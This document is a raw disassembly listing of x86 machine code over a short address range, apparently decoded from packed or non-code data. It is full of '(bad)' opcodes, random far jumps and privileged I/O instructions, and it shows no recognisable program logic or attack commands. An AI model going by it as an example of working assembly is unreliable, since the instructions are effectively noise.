  44f4d8:	dec    ebp
  44f4d9:	cmp    BYTE PTR [ecx+0x252b0103],0x7d
  44f4e0:	pop    es
  44f4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f4e2:	mov    bh,0xb4
  44f4e4:	iret   
  44f4e5:	popf   
  44f4e6:	push   esi
  44f4e7:	loope  0x44f51f
  44f4e9:	ins    DWORD PTR es:[edi],dx
  44f4ea:	in     al,0x9a
  44f4ec:	xor    al,0x29
  44f4ee:	sbb    eax,0xbe9dbb3d
  44f4f3:	clc    
  44f4f4:	sbb    BYTE PTR [ecx-0x66],ch
  44f4f7:	in     al,0x99
  44f4f9:	imul   esp,ecx,0x76
  44f4fc:	test   eax,0x6e5fac14
  44f501:	xchg   ch,ah
  44f503:	jmp    0x44f4e4
  44f505:	(bad)  
  44f506:	cld    
  44f507:	out    dx,al
  44f508:	sbb    al,0xc9
  44f50a:	add    esi,DWORD PTR cs:[edi+eiz*1]
  44f50e:	xchg   BYTE PTR [ebx+0x2a],dl
  44f511:	mov    al,ds:0xe3cace2b
  44f516:	ins    BYTE PTR es:[edi],dx
  44f517:	arpl   bp,ax
  44f519:	rol    bl,cl
  44f51b:	jbe    0x44f521
  44f51d:	or     al,0xbc
  44f51f:	aam    0xa1
  44f521:	cld    
  44f522:	cmp    edi,DWORD PTR [ebp-0x6c]
  44f525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f526:	dec    ebx
  44f527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f528:	out    0x49,eax
  44f52a:	jge    0x44f4ff
  44f52c:	mov    ds:0x3bd8a11a,eax
  44f531:	mov    bl,0xb0
  44f533:	xor    al,0x61
  44f535:	push   ebp
  44f536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f537:	pop    esp
  44f538:	int    0x9b
  44f53a:	jmp    0x44f4f2
  44f53c:	pop    ecx
  44f53d:	bound  edx,QWORD PTR [ebx+0x15043564]
  44f543:	xor    bl,BYTE PTR [ebx]
  44f545:	mov    eax,0xc0758bef
  44f54a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f54b:	jne    0x44f4d4
  44f54d:	mov    ebx,0xa82cedd6
  44f552:	pop    ebx
  44f553:	mov    bl,0xfc
  44f555:	cmp    edi,DWORD PTR [eax+0x41dca37c]
  44f55b:	jmp    0x587b:0xc6203571
  44f562:	mov    ecx,0x1ba76dc4
  44f567:	mov    ebp,0x89346330
  44f56c:	ret    0xdd74
  44f56f:	rol    BYTE PTR [ecx+eiz*2],cl
  44f572:	sub    eax,edi
  44f574:	out    0xf8,al
  44f576:	jl     0x44f593
  44f578:	popf   
  44f579:	add    DWORD PTR [ebp-0x2206a285],edi
  44f57f:	push   ecx
  44f580:	sub    ecx,DWORD PTR [esp+ebx*4-0x3]
  44f584:	ret    0xb46e
  44f587:	push   eax
  44f588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f589:	xor    bl,BYTE PTR [edi-0x13]
  44f58c:	sub    BYTE PTR [eax+0x5681a60b],0x18
  44f593:	dec    eax
  44f594:	pop    ebx
  44f595:	mov    eax,0x391e5dac
  44f59a:	js     0x44f588
  44f59c:	in     al,0x5b
  44f59e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  44f5a0:	or     al,0x25
  44f5a2:	dec    edx
  44f5a3:	inc    ebx
  44f5a4:	es (bad) 
  44f5a6:	punpcklwd mm5,mm2
  44f5a9:	(bad)  [ebx-0x69]
  44f5ac:	mov    ebp,0xd9ee60e3
  44f5b1:	push   ds
  44f5b2:	jne    0x44f5fe
  44f5b4:	jne    0x44f624
  44f5b6:	xor    edi,esi
  44f5b8:	jge    0x44f5f3
  44f5ba:	sub    DWORD PTR [ebx+0x20],0xffffff9d
  44f5be:	mov    ebx,0xc1d7f791
  44f5c3:	aam    0x70
  44f5c5:	xchg   edx,eax
  44f5c6:	dec    ebx
  44f5c7:	dec    esi
  44f5c8:	and    DWORD PTR [edi+0xd4104bd],0xffffffd3
  44f5cf:	es inc esi
  44f5d1:	cmp    BYTE PTR [edi+0x61],dh
  44f5d4:	push   esp
  44f5d5:	aad    0xef
  44f5d7:	fisub  WORD PTR [ebx]
  44f5d9:	aad    0xed
  44f5db:	xor    eax,0xbefe7975
  44f5e0:	popf   
  44f5e1:	push   eax
  44f5e2:	mov    edx,0xbfce79d8
  44f5e7:	sbb    al,0x6
  44f5e9:	mov    esi,0xd2c82434
  44f5ee:	sbb    al,0xb8
  44f5f0:	scas   al,BYTE PTR es:[edi]
  44f5f1:	mov    ecx,0x3b93ff3b
  44f5f6:	mov    ah,0x24
  44f5f8:	xor    bh,ch
  44f5fa:	mov    ah,BYTE PTR [eax]
  44f5fc:	add    eax,0xfcea9533
  44f601:	test   al,0x53
  44f603:	dec    ebx
  44f604:	inc    edi
  44f605:	leave  
  44f606:	jno    0x44f5f3
  44f608:	sub    DWORD PTR [edx+0x15bfc4a2],eax
  44f60e:	jne    0x44f5fd
  44f610:	adc    eax,0x53f0365a
  44f615:	cs sbb al,0x6f
  44f618:	xchg   DWORD PTR [ecx-0x2],edi
  44f61b:	xor    BYTE PTR [edi+0x4983aa35],ah
  44f621:	or     cl,al
  44f623:	cmp    al,0x83
  44f625:	mov    al,ds:0x54d1f1fb
  44f62a:	cmp    DWORD PTR [eax+0x10fa753],eax
  44f630:	dec    esi
  44f631:	mov    ebx,0x7fb444b9
  44f636:	mov    WORD PTR [ecx-0x1b],gs
  44f639:	xchg   ebx,eax
  44f63a:	sbb    esp,esi
  44f63c:	je     0x44f674
  44f63e:	leave  
  44f63f:	(bad)  
  44f640:	sbb    al,0x49
  44f642:	stos   DWORD PTR es:[edi],eax
  44f643:	and    DWORD PTR [ecx-0x38],esp
  44f646:	add    al,0xa6
  44f648:	push   cs
  44f649:	fwait
  44f64a:	jnp    0x44f5f8
  44f64c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  44f64e:	jp     0x44f66b
  44f650:	test   BYTE PTR [ecx+0x1f],dl
  44f653:	adc    eax,0x4524424c
  44f658:	xor    BYTE PTR [edx-0x2fe73127],dl
  44f65e:	xchg   ebp,eax
  44f65f:	test   DWORD PTR ds:0xb7eb639f,eax
  44f665:	in     eax,dx
  44f666:	rol    eax,cl
  44f668:	push   eax
  44f669:	stc    
  44f66a:	xchg   edx,eax
  44f66b:	jns    0x44f644
  44f66d:	push   0x0
  44f66f:	push   ebx
  44f670:	cmp    eax,0x6ea0a8f
  44f675:	nop
  44f676:	aam    0xc7
  44f678:	and    ecx,ebp
  44f67a:	nop
  44f67b:	xchg   DWORD PTR [edx],ebx
  44f67d:	scas   al,BYTE PTR es:[edi]
  44f67e:	sbb    BYTE PTR [edi+0x24b1a56a],cl
  44f684:	xor    edx,esi
  44f686:	es cwde 
  44f688:	sbb    dh,BYTE PTR gs:[edx-0x5524d812]
  44f68f:	pop    esp
  44f690:	and    ch,BYTE PTR [ecx]
  44f692:	cmp    eax,0x941f70e6
  44f697:	enter  0x8369,0xfb
  44f69b:	dec    edx
  44f69c:	in     eax,0x29
  44f69e:	out    0xe5,al
  44f6a0:	sbb    ah,BYTE PTR [ebx-0x62]
  44f6a3:	jle    0x44f6c9
  44f6a5:	pop    ss
  44f6a6:	add    al,bh
  44f6a8:	mov    ebx,0x1b74bc8e
  44f6ad:	imul   esp,esp,0x5e
  44f6b0:	gs and al,0xb1
  44f6b3:	lock sbb al,BYTE PTR [edi-0x7e]
  44f6b7:	mov    ds:0xb710b91b,al
  44f6bc:	mov    dl,0x90
  44f6be:	inc    ebp
  44f6bf:	clc    
  44f6c0:	retf   0xdc0a
  44f6c3:	jae    0x44f729
  44f6c5:	jae    0x44f6eb
  44f6c7:	jg     0x44f67f
  44f6c9:	shr    DWORD PTR [edi],cl
  44f6cb:	icebp  
  44f6cc:	daa    
  44f6cd:	dec    ecx
  44f6ce:	hlt    
  44f6cf:	push   0x516038d5
  44f6d4:	pop    ss
  44f6d5:	sbb    al,0x94
  44f6d7:	pushf  
  44f6d8:	xchg   ebp,eax
  44f6d9:	outs   dx,DWORD PTR ds:[esi]
  44f6da:	dec    ebp
  44f6db:	out    dx,eax
  44f6dc:	jl     0x44f6de
  44f6de:	(bad)  
  44f6df:	or     eax,0x3e975922
  44f6e4:	inc    ebx
  44f6e5:	repz push esi
  44f6e7:	jle    0x44f741
  44f6e9:	jg     0x44f738
  44f6eb:	xchg   DWORD PTR [esp+ebx*4+0x37],ebx
  44f6ef:	std    
  44f6f0:	dec    ebx
  44f6f1:	lods   eax,DWORD PTR ds:[esi]
  44f6f2:	ret    
  44f6f3:	add    eax,0x1ebfeca0
  44f6f8:	std    
  44f6f9:	(bad)  
  44f6fb:	hlt    
  44f6fc:	fild   QWORD PTR [ebx+0x3a]
  44f6ff:	xchg   ecx,eax
  44f700:	and    eax,0xd8ea4dcd
  44f705:	push   esp
  44f706:	fwait
  44f707:	adc    al,0x18
  44f709:	xor    BYTE PTR [esi],al
  44f70b:	loop   0x44f6e4
  44f70d:	loope  0x44f6c5
  44f70f:	je     0x44f711
  44f711:	pop    ebx
  44f712:	leave  
  44f713:	xchg   edx,eax
  44f714:	gs int3 
  44f716:	push   ds
  44f717:	hlt    
  44f718:	push   ebp
  44f719:	cmp    DWORD PTR [ecx-0x4],esp
  44f71c:	or     eax,0xbb6176ca
  44f721:	test   al,0xfb
  44f723:	sbb    bl,al
  44f725:	ret    0x8945
  44f728:	push   ebp
  44f729:	adc    ebx,DWORD PTR [ecx+0x1c23abe7]
  44f72f:	stc    
  44f730:	push   ecx
  44f731:	leave  
  44f732:	inc    esp
  44f733:	rcl    DWORD PTR [edi-0x64],0xa
  44f737:	pop    eax
  44f738:	cmp    eax,0xe5e9201c
  44f73d:	xor    dl,BYTE PTR [ebx-0x48c90a10]
  44f743:	adc    DWORD PTR [edi+0x22d975d9],ecx
  44f749:	dec    esi
  44f74a:	imul   ebp,DWORD PTR [ebx+0x23],0xfffffff3
  44f74e:	rcl    ebp,0x3a
  44f751:	call   0xe516:0x31b390bb
  44f758:	retf   0xa6fa
  44f75b:	mov    al,ds:0x44b30d5d
  44f760:	pop    ebp
  44f761:	pop    edi
  44f762:	cmp    al,0xef
  44f764:	jne    0x44f7b9
  44f766:	aad    0xe4
  44f768:	in     al,0xe5
  44f76a:	mov    ds:0x96db7c36,al
  44f76f:	imul   esp,DWORD PTR [ecx],0xf270c7d9
  44f775:	fdivr  DWORD PTR [ecx]
  44f777:	mov    edi,0xf3d50d85
  44f77c:	or     ebp,DWORD PTR [edi-0x8da5ab7]
  44f782:	lods   al,BYTE PTR ds:[esi]
  44f783:	into   
  44f784:	and    eax,0xf67c1489
  44f789:	xor    eax,0x747195a
  44f78e:	pop    edx
  44f78f:	(bad)  
  44f790:	not    DWORD PTR [edi+0x30]
  44f793:	aam    0x72
  44f795:	ins    BYTE PTR es:[edi],dx
  44f796:	inc    ebp
  44f797:	sbb    eax,0x70a5696
  44f79c:	idiv   ah
  44f79e:	xchg   esi,eax
  44f79f:	out    0xa5,al
  44f7a1:	jle    0x44f7d6
  44f7a3:	repz and dl,BYTE PTR [ebp-0xf]
  44f7a7:	push   edx
  44f7a8:	or     BYTE PTR [ebx-0x4e],ah
  44f7ab:	jae    0x44f776
  44f7ad:	iret   
  44f7ae:	push   ss
  44f7af:	test   BYTE PTR [esi],al
  44f7b1:	mov    esp,0xa39b14e3
  44f7b6:	lahf   
  44f7b7:	xor    ecx,ebp
  44f7b9:	cli    
  44f7ba:	jo     0x44f75a
  44f7bc:	sbb    cl,BYTE PTR [ebp-0x65]
  44f7bf:	ret    
  44f7c0:	pop    ecx
  44f7c1:	inc    esp
  44f7c2:	pusha  
  44f7c3:	call   DWORD PTR ds:0x17e8107b
  44f7c9:	xchg   BYTE PTR [edi-0x3685f1e6],bl
  44f7cf:	mov    ah,0x2
  44f7d1:	test   eax,0xc30cdb2b
  44f7d6:	imul   ebx,DWORD PTR [ebp+esi*8-0x916fb7c],0x6aa76bbc
  44f7e1:	mov    al,0x7f
  44f7e3:	ins    DWORD PTR es:[edi],dx
  44f7e4:	fxch   st(0)
  44f7e6:	(bad)  
  44f7e7:	in     al,0xd1
  44f7e9:	pop    edi
  44f7ea:	jno    0x44f82f
  44f7ec:	jno    0x44f7ca
  44f7ee:	mov    esi,0xce30d2ec
  44f7f3:	sub    al,0xa5
  44f7f5:	test   eax,ebp
  44f7f7:	xor    al,0x83
  44f7f9:	mov    ds:0x49bf60b5,eax
  44f7fe:	sub    DWORD PTR [edi-0x548457e0],0xb0c296e7
  44f808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f809:	test   al,0xb
  44f80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f80c:	mov    ecx,0x5652438b
  44f811:	sub    BYTE PTR [esi+eax*2],bh
  44f814:	ficomp WORD PTR [esi]
  44f816:	mov    cl,0xa4
  44f818:	mov    ebp,0xb5fe1cf8
  44f81d:	jle    0x44f7f0
  44f81f:	neg    DWORD PTR [ebx]
  44f821:	xor    al,0x20
  44f823:	ds and eax,0x3926d8ba
  44f829:	aas    
  44f82a:	mov    ah,0xe4
  44f82c:	aaa    
  44f82d:	mov    BYTE PTR [eax+0x7211d5ec],cl
  44f833:	sti    
  44f834:	shl    DWORD PTR [ecx+ebx*4],cl
  44f837:	mov    al,0xe2
  44f839:	push   esp
  44f83a:	ret    0x9ea4
  44f83d:	adc    eax,esi
  44f83f:	je     0x44f853
  44f841:	mov    es,WORD PTR [ecx-0x5f]
  44f844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f845:	sub    BYTE PTR [edi-0x445f15d0],bh
  44f84b:	cmp    ah,BYTE PTR [ecx]
  44f84d:	jnp    0x44f876
  44f84f:	test   BYTE PTR [edx+edi*1-0x6bde900d],0x5c
  44f857:	call   0x4f2a9d30
  44f85c:	push   es
  44f85d:	ror    bl,cl
  44f85f:	test   BYTE PTR [ebp+0x13f8d253],dh
  44f865:	or     ecx,edx
  44f867:	cmc    
  44f868:	add    edi,DWORD PTR [edx+eiz*2]
  44f86b:	adc    bl,BYTE PTR es:[esp+esi*4+0x24]
  44f870:	xchg   ecx,eax
  44f871:	(bad)  
  44f872:	sar    esp,cl
  44f874:	xor    eax,0xb8ece8fe
  44f879:	cmc    
  44f87a:	jo     0x44f802
  44f87c:	and    edi,DWORD PTR [ecx+0x4f]
  44f87f:	cmp    BYTE PTR [edx+0x6fb099a3],ah
  44f885:	inc    ebx
  44f886:	push   edx
  44f888:	push   ss
  44f889:	xchg   ecx,eax
  44f88a:	xchg   edi,eax
  44f88b:	mov    esi,0xe2286edd
  44f890:	sbb    ecx,edi
  44f892:	add    dl,BYTE PTR [esi-0x3f]
  44f895:	test   eax,0xb48ac36e
  44f89a:	jmp    0x44f8c2
  44f89c:	mov    eax,ds:0xacc7fc88
  44f8a1:	fwait
  44f8a2:	push   0x5e0a44d
  44f8a7:	hlt    
  44f8a8:	and    eax,DWORD PTR [ebx+esi*2]
  44f8ab:	call   0x74fee647
  44f8b0:	repz fistp QWORD PTR [ebx-0x25]
  44f8b4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  44f8b6:	mov    ebp,DWORD PTR [esi-0x2b]
  44f8b9:	lods   eax,DWORD PTR ds:[esi]
  44f8ba:	cmp    BYTE PTR [edx+0x5e],dl
  44f8bd:	pop    eax
  44f8be:	lods   al,BYTE PTR ds:[esi]
  44f8bf:	adc    cl,BYTE PTR cs:[eax]
  44f8c2:	mov    bl,0xc4
  44f8c4:	jmp    0x442bc4c0
  44f8c9:	mov    ds:0x6c0be4cb,al
  44f8ce:	out    0x1d,al
  44f8d0:	push   ebp
  44f8d1:	mov    al,0xe7
  44f8d3:	sub    bh,dh
  44f8d5:	mov    ds:0x7c17d4b0,al
  44f8da:	sahf   
  44f8db:	sti    
  44f8dc:	xor    eax,0xcef31782
  44f8e1:	ret    0x5329
  44f8e4:	mov    bl,BYTE PTR [ecx]
  44f8e6:	or     ebx,DWORD PTR [ebp+0x2]
  44f8e9:	out    dx,eax
  44f8ea:	sti    
  44f8eb:	pop    edx
  44f8ec:	push   ds
  44f8ed:	sbb    DWORD PTR [eax],esp
  44f8ef:	mov    BYTE PTR [edi+ecx*8],bl
  44f8f2:	pushf  
  44f8f3:	test   DWORD PTR [edx],esp
  44f8f5:	push   cs
  44f8f6:	dec    esp
  44f8f7:	xchg   esp,eax
  44f8f8:	es xchg ecx,eax
  44f8fa:	in     al,0xf7
  44f8fc:	cmp    esp,ebx
  44f8fe:	mov    cl,0xdc
  44f900:	sbb    ch,cl
  44f902:	jge    0x44f890
  44f904:	mov    ebx,0x72d2c627
  44f909:	loop   0x44f8b6
  44f90b:	and    eax,0xba45e025
  44f910:	ins    DWORD PTR es:[edi],dx
  44f911:	sub    al,0xb4
  44f913:	out    0xa3,al
  44f915:	(bad)  
  44f917:	clc    
  44f918:	xor    ah,BYTE PTR [esi-0x62]
  44f91b:	inc    esi
  44f91c:	or     ecx,DWORD PTR [edi]
  44f91e:	mov    ch,0x50
  44f920:	(bad)  
  44f921:	cmp    DWORD PTR [ebp+0x42],0x90f3a7eb
  44f928:	xchg   ebx,eax
  44f929:	mov    al,ds:0xcede2157
  44f92e:	mov    edi,0xb81435e1
  44f933:	in     al,0xe8
  44f935:	stos   DWORD PTR es:[edi],eax
  44f936:	retf   
  44f937:	aad    0x25
  44f939:	sub    ebp,DWORD PTR [edx-0x1b]
  44f93c:	lock mov cl,0xc1
  44f93f:	push   0x986391b
  44f944:	scas   al,BYTE PTR es:[edi]
  44f945:	cmp    bl,bh
  44f947:	mov    cl,0x5f
  44f949:	popf   
  44f94a:	cmp    eax,DWORD PTR [esi]
  44f94c:	div    DWORD PTR [edi+ecx*4+0x2c]
  44f950:	inc    eax
  44f951:	jns    0x44f8fe
  44f953:	inc    edx
  44f954:	pop    ds
  44f955:	cmp    BYTE PTR [edi+0x6d816574],0xa8
  44f95c:	xor    eax,0x48a98b9f
  44f961:	int    0xc5
  44f963:	in     al,dx
  44f964:	into   
  44f965:	sub    BYTE PTR [esi],0xd6
  44f968:	push   ecx
  44f969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f96a:	jnp    0x44f8f5
  44f96c:	int    0xf6
  44f96e:	jp     0x44f9d2
  44f970:	(bad)  
  44f971:	imul   edi,ebp,0x41
  44f974:	push   ebx
  44f975:	test   al,0x97
  44f977:	sbb    eax,0x1bb657be
  44f97c:	mov    ecx,0x55459dcc
  44f981:	fucom  st(3)
  44f983:	lock jb 0x44f958
  44f986:	cmp    BYTE PTR [eax-0x161b191b],bh
  44f98c:	pop    eax
  44f98d:	add    al,0x4d
  44f98f:	outs   dx,BYTE PTR ds:[esi]
  44f990:	sbb    edi,DWORD PTR [ecx+0x2f]
  44f993:	pop    eax
  44f994:	test   ebp,0xb901a36b
  44f99a:	imul   edi,DWORD PTR [edx+0x4135cfd0],0xffffffed
  44f9a1:	test   al,0xa7
  44f9a3:	and    BYTE PTR [ebx],0x79
  44f9a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f9a7:	xchg   ecx,eax
  44f9a8:	(bad)  [ebp-0x5b3dada0]
  44f9ae:	jmp    0x44fa07
  44f9b0:	jne    0x44f978
  44f9b2:	imul   ebp,DWORD PTR [edx+0x6a],0x34
  44f9b6:	loopne 0x44f958
  44f9b8:	icebp  
  44f9b9:	cmc    
  44f9ba:	pop    esi
  44f9bc:	pop    ebp
  44f9bd:	es mov edi,0x92a861d0
  44f9c3:	dec    ebp
  44f9c4:	xor    eax,0x5eeb95c9
  44f9c9:	sbb    DWORD PTR [ecx-0x40],edx
  44f9cc:	push   ecx
  44f9cd:	sub    DWORD PTR [esi-0x5e6e9c4d],ebp
  44f9d3:	dec    esp
  44f9d4:	outs   dx,DWORD PTR ds:[esi]
  44f9d5:	jae    0x44fa14
  44f9d7:	repz push es
  44f9d9:	and    al,0xa5
  44f9db:	add    ch,BYTE PTR [eax-0x483bc578]
  44f9e1:	xor    edi,DWORD PTR [edx-0xf]
  44f9e4:	sbb    edi,DWORD PTR [edx+0x5d06d6f2]
  44f9ea:	mov    al,0xb4
  44f9ec:	xor    bl,BYTE PTR [esi-0x5d88b0f5]
  44f9f2:	inc    edx
  44f9f3:	ror    DWORD PTR [esi-0xc],1
  44f9f6:	sbb    cl,BYTE PTR [edi]
  44f9f8:	out    0xc6,al
  44f9fa:	mov    cl,0x4
  44f9fc:	cmp    eax,0x16e0d9bb
  44fa01:	popa   
  44fa02:	test   edi,ecx
  44fa04:	and    BYTE PTR [edi+0xaf15c56],bh
  44fa0a:	mov    ebp,ds
  44fa0c:	and    BYTE PTR [ecx],bl
  44fa0e:	mov    esp,0x2811c8a2
  44fa13:	inc    edi
  44fa14:	inc    esi
  44fa15:	add    BYTE PTR [ebx],al
  44fa17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44fa18:	xchg   ebp,eax
  44fa19:	cmc    
  44fa1a:	retf   0x68ec
  44fa1d:	adc    BYTE PTR [edi-0x7f],0x28
  44fa21:	sub    DWORD PTR [ebx],ebx
  44fa23:	pop    ds
  44fa24:	or     BYTE PTR [edx+0x27],ah
  44fa27:	and    BYTE PTR es:[eax+0x3ced36c7],dl
  44fa2e:	scas   eax,DWORD PTR es:[edi]
  44fa2f:	mov    dl,0x1a
  44fa31:	test   eax,0x60301b11
  44fa36:	popa   
  44fa37:	mov    ecx,0xef1fc902
  44fa3c:	loope  0x44f9d2
  44fa3e:	xchg   esi,eax
  44fa3f:	and    eax,0xe8c2496f
  44fa44:	leave  
  44fa45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fa46:	retf   
  44fa47:	xchg   edi,eax
  44fa48:	popa   
  44fa49:	shl    DWORD PTR [ebx+0x51],cl
  44fa4c:	push   esi
  44fa4d:	push   edi
  44fa4e:	fwait
  44fa4f:	and    al,0xe5
  44fa51:	stc    
  44fa52:	mov    bl,0x24
  44fa54:	xchg   ebx,eax
  44fa55:	push   esi
  44fa56:	cmp    al,0x40
  44fa58:	gs retf 
  44fa5a:	push   edx
  44fa5b:	repnz push cs
  44fa5d:	(bad)  
  44fa5e:	scas   eax,DWORD PTR es:[edi]
  44fa5f:	retf   
  44fa60:	mov    edx,0xe12ab677
  44fa65:	out    0xbd,eax
  44fa67:	mov    ah,0x3e
  44fa69:	mov    WORD PTR [esi-0x64614bac],es
  44fa6f:	test   DWORD PTR [eax+0x489cf8a9],ebp
  44fa75:	cwde   
  44fa76:	addr16 ret 
  44fa78:	push   eax
  44fa79:	sar    DWORD PTR [eax+0x1f6931c4],cl
  44fa7f:	jb     0x44fa56
  44fa81:	data16 int3 
  44fa83:	repz imul esp,DWORD PTR ds:[ebx+0x3c],0x61
  44fa89:	inc    eax
  44fa8a:	cmp    al,0xe4
  44fa8c:	and    ecx,ecx
  44fa8e:	loop   0x44fa1b
  44fa90:	mov    ecx,0x22faec85
  44fa95:	mov    ds:0x2fd5446b,al
  44fa9a:	push   es
  44fa9b:	xchg   DWORD PTR [ecx],eax
  44fa9d:	clc    
  44fa9e:	pop    esp
  44fa9f:	std    
  44faa0:	popa   
  44faa1:	ds mov ebp,0x189a9064
  44faa7:	pop    ebp
  44faa8:	push   ax
  44faaa:	loopne 0x44faed
  44faac:	out    dx,al
  44faad:	mov    al,ds:0x273416b7
  44fab2:	mov    al,ds:0xb5df8928
  44fab7:	mov    ah,0x5a
  44fab9:	cmp    ecx,ebx
  44fabb:	pop    edx
  44fabc:	(bad)  
  44fabd:	mov    cl,0xb6
  44fabf:	sbb    DWORD PTR [edi+0x655c129b],esp
  44fac5:	or     eax,0x8916f0a5
  44faca:	mov    ds,WORD PTR [ecx-0x2ce05b7b]
  44fad0:	or     DWORD PTR [ecx],edx
  44fad2:	jl     0x44fa6f
  44fad4:	jmp    0x706c8dbf
  44fad9:	out    dx,al
  44fada:	or     ah,dh
  44fadc:	cld    
  44fadd:	fnstenv [edi-0x63]
  44fae0:	fcmovbe st,st(6)
  44fae2:	rcl    DWORD PTR [edi+0x2],cl
  44fae5:	adc    BYTE PTR ds:0xb4b31bfd,ah
  44faeb:	bound  esp,QWORD PTR ds:0x8ce5003d
  44faf1:	sub    BYTE PTR [ecx+0x637921d8],bl
  44faf7:	sub    BYTE PTR [edi-0x3d],dl
  44fafa:	jns    0x44fac7
  44fafc:	fwait
  44fafd:	in     eax,0x1d
  44faff:	adc    al,0xdd
  44fb01:	mov    ds:0x1c0d5fb,al
  44fb06:	mov    ss,WORD PTR [esi+eiz*1-0x32618f7]
  44fb0d:	mov    esp,0x55e34002
  44fb12:	cmp    edx,DWORD PTR [edi-0x22fc8a63]
  44fb18:	inc    ebp
  44fb19:	mov    edi,0x5615f3b5
  44fb1e:	and    ah,cl
  44fb20:	sbb    cl,bh
  44fb22:	sub    ebp,DWORD PTR [eax+0x7cb30b55]
  44fb28:	call   0x2c40:0x12933c0a
  44fb2f:	adc    al,0x98
  44fb31:	fmul   DWORD PTR [edi-0x16]
  44fb34:	and    DWORD PTR [ecx-0x2f],edi
  44fb37:	cdq    
  44fb38:	mov    DWORD PTR [edx-0x64f66510],ebp
  44fb3e:	imul   ebp,DWORD PTR [edi+0x9eed0c6],0xffffffc9
  44fb45:	stos   BYTE PTR es:[edi],al
  44fb46:	xor    eax,0xbafb2db6
  44fb4b:	fs test BYTE PTR gs:[ecx+0x6f2c76e4],0x3f
  44fb54:	aas    
  44fb55:	scas   al,BYTE PTR es:[edi]
  44fb56:	retf   
  44fb57:	lods   eax,DWORD PTR ds:[esi]
  44fb58:	or     BYTE PTR [ebx+0x37630211],0xa8
  44fb5f:	sub    eax,0x24b9bf67
  44fb64:	sbb    BYTE PTR [eax],dh
  44fb66:	test   BYTE PTR [eax+0x26f21218],bh
  44fb6c:	jne    0x44fba2
  44fb6e:	mov    edi,0xa85c12ea
  44fb73:	adc    DWORD PTR [edx-0x68e241],eax
  44fb79:	and    eax,0xa8b944b8
  44fb7e:	stos   DWORD PTR es:[edi],eax
  44fb7f:	inc    edx
  44fb80:	lock jmp 0x36470d2
  44fb86:	jecxz  0x44fb62
  44fb88:	out    dx,al
  44fb89:	fidiv  DWORD PTR [ebx+0x47929334]
  44fb8f:	mov    eax,ds:0xe979c3d5
  44fb94:	loopne 0x44fbbb
  44fb96:	or     bh,BYTE PTR [edi-0x578776e8]
  44fb9c:	jns    0x44fb83
  44fb9e:	pop    es
  44fb9f:	dec    esi
  44fba0:	nop
  44fba1:	sahf   
  44fba2:	sub    esp,DWORD PTR [edx+esi*1+0xd89a426]
  44fba9:	pavgw  mm3,mm5
  44fbac:	push   edx
  44fbad:	push   0xffffffb3
  44fbaf:	(bad)  
  44fbb0:	icebp  
  44fbb1:	fisubr WORD PTR [ecx]
  44fbb3:	pop    eax
  44fbb4:	aam    0xa3
  44fbb6:	or     esp,DWORD PTR [edi]
  44fbb8:	lahf   
  44fbb9:	sbb    al,0xbc
  44fbbb:	out    0xd2,eax
  44fbbd:	rcl    DWORD PTR [esp+eax*2+0x74b857ab],1
  44fbc4:	xchg   DWORD PTR [esi+ecx*1],edx
  44fbc7:	aad    0xd6
  44fbc9:	fld    DWORD PTR [ebx]
  44fbcb:	sub    cl,dl
  44fbcd:	lahf   
  44fbce:	neg    DWORD PTR [ebx-0xd]
  44fbd1:	into   
  44fbd2:	scas   eax,DWORD PTR es:[edi]
  44fbd3:	mov    WORD PTR [eax+0x25],?
  44fbd6:	mov    edi,0x354912d4
  44fbdb:	fsubp  st(1),st
  44fbdd:	mov    cl,bh
  44fbdf:	mov    edi,0x6cb81387
  44fbe4:	dec    ebp
  44fbe5:	repnz push edx
  44fbe7:	pop    es
  44fbe8:	loope  0x44fb75
  44fbea:	and    eax,0x958324b5
  44fbef:	pop    esp
  44fbf0:	loop   0x44fb93
  44fbf2:	fstp   TBYTE PTR [edi]
  44fbf4:	jbe    0x44fbcc
  44fbf6:	dec    ebx
  44fbf7:	push   edi
  44fbf8:	dec    ebx
  44fbf9:	inc    eax
  44fbfa:	js     0x44fc75
  44fbfc:	js     0x44fc4c
  44fbfe:	mov    bh,0xf4
  44fc00:	mov    ds:0x6d071fd2,eax
  44fc05:	test   al,0xb
  44fc07:	fcomp  QWORD PTR [eax]
  44fc09:	addr16 loopne 0x44fbfd
  44fc0c:	frstor [ecx]
  44fc0e:	mov    ecx,0x9ad99546
  44fc13:	arpl   WORD PTR [ecx],cx
  44fc15:	xchg   ecx,eax
  44fc16:	imul   edi,DWORD PTR [edi],0xfffffff9
  44fc19:	loop   0x44fbd2
  44fc1b:	adc    eax,0x9b587059
  44fc20:	or     al,0x43
  44fc22:	mov    edi,0xada55474
  44fc27:	jbe    0x44fc4c
  44fc29:	pop    esi
  44fc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44fc2b:	ss pop es
  44fc2d:	out    dx,eax
  44fc2e:	mov    ebx,0x6b9f4100
  44fc33:	call   0x64a6d323
  44fc38:	jae    0x44fc5d
  44fc3a:	fnsave [eax-0x1f]
  44fc3d:	jmp    0x44fbd1
  44fc3f:	jbe    0x44fc27
  44fc41:	jl     0x44fbf3
  44fc43:	pusha  
  44fc44:	das    
  44fc45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fc46:	mov    esp,DWORD PTR ds:0xd9b274ce
  44fc4c:	add    bh,al
  44fc4e:	pop    ebp
  44fc4f:	jecxz  0x44fc67
  44fc51:	aaa    
  44fc52:	pop    ebx
  44fc53:	jns    0x44fc1b
  44fc55:	mov    eax,ds:0x6932cd77
  44fc5a:	aam    0xe1
